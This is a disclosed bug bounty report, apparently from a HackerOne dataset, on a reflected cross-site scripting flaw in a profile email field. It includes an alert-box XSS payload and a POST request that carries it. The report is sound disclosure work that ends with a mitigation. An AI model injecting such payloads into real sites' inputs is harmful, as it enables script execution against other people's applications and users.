---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '799839'
original_report_id: '799839'
title: Reflected XSS - in Email Input
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2020-02-19T14:58:54.843Z'
disclosed_at: '2022-03-18T19:01:11.951Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS - in Email Input

## Metadata

- HackerOne Report ID: 799839
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2022-03-18T19:01:11.951Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Target Url**
https://█████

**Summary:**
Hello, I found a reflected xss injection in the email input when updating user profile. Seems Email input is not sanitized and the special characters are not encoded.

**xss payload used**
"><img src=x onerror=alert(1);>

## Step-by-step Reproduction Instructions

1. Navigate to the target url `https://███/█████/` and login.
2. Then go to `My Profile`.
3. Set any password. In Email input, add the payload next to the email.
Example `your_email@gmail.com"><img src=x onerror=alert(1);>`
Then click save.

See this POST Request
```
POST /██████/edit_profile/ HTTP/1.1
Host: ████████

REQUEST HEADER HERE

-----------------------------191691572411478
Content-Disposition: form-data; name="action"

save_info
-----------------------------191691572411478
Content-Disposition: form-data; name="password[original]"

NEWPASSWORD
-----------------------------191691572411478
Content-Disposition: form-data; name="password[confirmed]"

NEWPASSWORD
-----------------------------191691572411478
Content-Disposition: form-data; name="email[original]"

███████"><img src=x onerror=alert(1);>
-----------------------------191691572411478--
```
And an Alert will pop up ;)
█████████

## Suggested Mitigation/Remediation Actions
Sanitize input fields or encode/escape special characters to avoid xss.

## Impact

An attacker can execute malicious javascript codes on the target application.

Hope this is not duplicate :|

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
